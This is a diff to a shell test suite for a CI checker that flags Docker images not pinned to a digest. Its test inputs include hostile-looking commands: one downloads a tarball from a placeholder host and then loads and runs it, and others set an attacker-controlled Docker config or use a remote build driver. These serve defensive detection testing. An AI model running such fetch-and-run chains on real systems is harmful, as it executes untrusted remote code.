@@ -643,7 +643,7 @@ case_ run-local-tag            ok  "$head
       - run: docker tag \"\$src\" fa-production
       - run: docker run --rm fa-production"
 case_ run-local-build          ok  "$(r 'docker build -t localimg . && docker run localimg')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
-case_ run-local-skopeo         ok  "$(r 'skopeo copy oci-archive:/tmp/a.oci docker-daemon:fa-debug:latest && docker run fa-debug:latest')"
+case_ run-local-skopeo         bad "$(r 'skopeo copy oci-archive:/tmp/a.oci docker-daemon:fa-debug:latest && docker run fa-debug:latest')"
 case_ run-comment              ok  "$(r 'true # docker run alpine')"
 case_ run-echo                 ok  "$(r 'echo docker run alpine')"
 case_ run-crane-digest-only    ok  "$(r 'crane digest ghcr.io/x/y:1.0')"
@@ -1047,5 +1047,13 @@ case_ n18-config-other         bad "$(rb 'export DOCKER_CONFIG=/tmp/attacker; do
 case_ n18-config-fresh-ok      ok  "$(rb 'DOCKER_CONFIG=$(mktemp -d); export DOCKER_CONFIG; docker ps')"
 case_ n19-buildx-remote        bad "$(r 'docker buildx create --driver remote tcp://x:1234 --use')"
 case_ n20-import-url           bad "$(r 'docker import https://x.example/rootfs.tar img:1')"
+# --- Sonnet #164 r14 (NEW-21, NEW-22): a loaded tarball or an archive copy is never "the job's own bytes"
+case_ n21-load-tag-run         bad "$(rb 'curl -sL https://x.example/i.tar -o i.tar; docker load -i i.tar; docker tag sha256:deadbeef myname:latest; docker run myname:latest')"
+case_ n21-tag-unpinned-src     bad "$(rb 'docker tag alpine:latest mine; docker run mine')"
+case_ n21-tag-pinned-src-ok    ok  "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 mine; docker run mine')"
+case_ n21-tag-variable-src-ok  ok  "$(rb 'docker tag "${repo}@${d}" "fa-${v}"; docker run fa-production')"
+case_ n22-archive-to-daemon-run bad "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; docker run img:1')"
+case_ n22-archive-scan-ok      ok  "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; grype docker:img:1; docker scout cves local://img:1')"
+case_ n22-pinned-to-daemon-ok   ok  "$(rb 'skopeo copy docker://alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 docker-daemon:img:1; docker run img:1')"
 echo "check-action-pins: $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
